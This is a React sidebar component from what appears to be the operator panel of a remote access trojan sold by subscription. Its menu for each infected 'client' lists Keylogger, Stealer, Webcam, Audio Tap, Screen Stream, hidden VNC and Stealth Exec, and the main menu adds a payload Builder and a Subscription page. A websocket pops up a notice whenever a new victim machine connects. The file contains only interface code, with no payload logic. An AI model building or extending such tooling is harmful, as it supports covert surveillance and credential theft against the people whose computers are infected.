import React, { useState, useEffect } from 'react';
import { Link, useLocation } from 'react-router-dom';
import { Users, Hammer, Bell, FileCode, Globe, ShoppingCart, Settings, LogOut, Terminal, Video, ArrowLeft, Folder, Activity, Camera, Volume2, Keyboard, MessageSquare, Info, Zap, Ghost, Shield, Monitor } from 'lucide-react';
import { WS_BASE_URL } from '../config';

export default function Sidebar() {
  const location = useLocation();
  const isClientMode = location.pathname.startsWith('/client/');
  
  const pathParts = location.pathname.split('/');
  const clientId = pathParts[2]; 
  
  const [newClient, setNewClient] = useState(null);

  useEffect(() => {
      let ws = null;
      let reconnectInterval = null;

      const connect = () => {
          ws = new WebSocket(`${WS_BASE_URL}/ws/global`);
          
          ws.onopen = () => {
              console.log("[Sidebar] Global WS Connected");
          };

          ws.onmessage = (event) => {
              const msg = event.data;
              console.log("[Sidebar] WS Message:", msg);
              if (typeof msg === 'string' && msg.startsWith("NEW_CLIENT|")) {
                  const [_, name, id] = msg.split('|');
                  setNewClient({ specs: { pc_name: name }, id: id });
                  setTimeout(() => setNewClient(null), 5000);
              }
          };

          ws.onclose = () => {
              console.log("[Sidebar] Global WS Closed, reconnecting...");
              // Try reconnect in 3s
              reconnectInterval = setTimeout(connect, 3000);
          };
      };

      connect();

      return () => {
          if (ws) ws.close();
          if (reconnectInterval) clearTimeout(reconnectInterval);
      };
  }, []);

  const MenuItem = ({ to, icon: Icon, label, danger = false }) => {
    const isActive = location.pathname === to;
    return (
      <Link 
        to={to} 
        title={label}
        className={`w-12 h-12 flex items-center justify-center rounded-md mb-2 transition-all duration-200 group relative
          ${isActive 
            ? 'text-cyan-400 bg-[#222] border-l-2 border-cyan-400' 
            : danger 
                ? 'text-red-500 hover:text-red-300 hover:bg-red-900/20' 
                : 'text-gray-500 hover:text-gray-200 hover:bg-[#1f1f1f]'
          }`}
      >
        <Icon size={22} strokeWidth={1.5} />
        <div className="absolute left-14 bg-[#333] text-white text-xs px-2 py-1 rounded opacity-0 group-hover:opacity-100 pointer-events-none transition-opacity whitespace-nowrap z-50 border border-gray-700 font-mono">
          {label}
        </div>
      </Link>
    );
  };

  return (
    <div className="w-[70px] bg-[#111] border-r border-[#222] flex flex-col items-center py-4 z-20 shadow-xl">
      <div className="mb-8 p-2">
        {isClientMode ? (
            <Link to="/" className="w-10 h-10 bg-[#222] text-gray-400 hover:text-white rounded-lg flex items-center justify-center transition border border-[#333]" title="Back to Dashboard">
                <ArrowLeft size={20} />
            </Link>
        ) : (
            <div className="w-10 h-10 bg-cyan-900/20 text-cyan-400 rounded-lg flex items-center justify-center font-bold border border-cyan-900/50 shadow-[0_0_15px_rgba(0,255,255,0.1)]">
                G
            </div>
        )}
      </div>

      <nav className="flex-1 flex flex-col gap-1 w-full px-2">
        {isClientMode ? (
            <>
                <div className="text-[10px] text-gray-600 text-center font-mono mb-2 uppercase tracking-tighter truncate px-1">
                    {clientId ? clientId.split(':')[0] : 'Client'}
                </div>
                <MenuItem to={`/client/${clientId}`} icon={Terminal} label="Terminal" />
                <MenuItem to={`/client/${clientId}/screen`} icon={Video} label="Screen Stream" />
                <MenuItem to={`/client/${clientId}/webcam`} icon={Camera} label="Webcam" />
                <MenuItem to={`/client/${clientId}/audio`} icon={Volume2} label="Audio Tap" />
                <MenuItem to={`/client/${clientId}/keylog`} icon={Keyboard} label="Keylogger" />
                <MenuItem to={`/client/${clientId}/stealer`} icon={Shield} label="Stealer" />
                <MenuItem to={`/client/${clientId}/files`} icon={Folder} label="File Manager" />
                <MenuItem to={`/client/${clientId}/process`} icon={Activity} label="Task Manager" />
                <MenuItem to={`/client/${clientId}/browser`} icon={Globe} label="Open URL" />
                <MenuItem to={`/client/${clientId}/chat`} icon={MessageSquare} label="Chat" />
                <MenuItem to={`/client/${clientId}/sysinfo`} icon={Info} label="Sys Info" />
                <MenuItem to={`/client/${clientId}/hvnc`} icon={Ghost} label="HVNC" />
                <MenuItem to={`/client/${clientId}/exec`} icon={Zap} label="Stealth Exec" danger={true} />
                
                <div className="mt-auto"></div>
                <div className="border-b border-[#222] my-2 mx-2"></div>
                <MenuItem to="/" icon={LogOut} label="Disconnect" danger={true} />
            </>
        ) : (
            <>
                <MenuItem to="/" icon={Users} label="Clients" />
                <MenuItem to="/builder" icon={Hammer} label="Builder" />
                <div className="border-b border-[#222] my-2 mx-2"></div>
                <MenuItem to="/notify" icon={Bell} label="Notifications" />
                <MenuItem to="/scripts" icon={FileCode} label="Scripts" />
                <MenuItem to="/community" icon={Globe} label="Community" />
                <MenuItem to="/subs" icon={ShoppingCart} label="Subscription" />
            </>
        )}
      </nav>

      {!isClientMode && (
        <div className="w-full px-2 mt-auto">
            <MenuItem to="/settings" icon={Settings} label="Settings" />
        </div>
      )}

      {/* New Client Notification Toast */}
      {newClient && (
        <div className="fixed bottom-4 right-4 bg-[#1a1a1a] border border-cyan-500/50 text-white px-4 py-3 rounded shadow-[0_0_20px_rgba(0,255,255,0.2)] flex items-center gap-3 animate-slide-up z-50">
            <div className="p-2 bg-cyan-500/20 rounded-full text-cyan-400">
                <Monitor size={24} />
            </div>
            <div>
                <div className="font-bold text-sm text-cyan-400">New Client Connected!</div>
                <div className="text-xs text-gray-300 font-mono mt-1">
                    {newClient.specs.pc_name || "Unknown PC"} <br/>
                    <span className="text-gray-500">{newClient.id}</span>
                </div>
            </div>
        </div>
      )}
    </div>
  );
}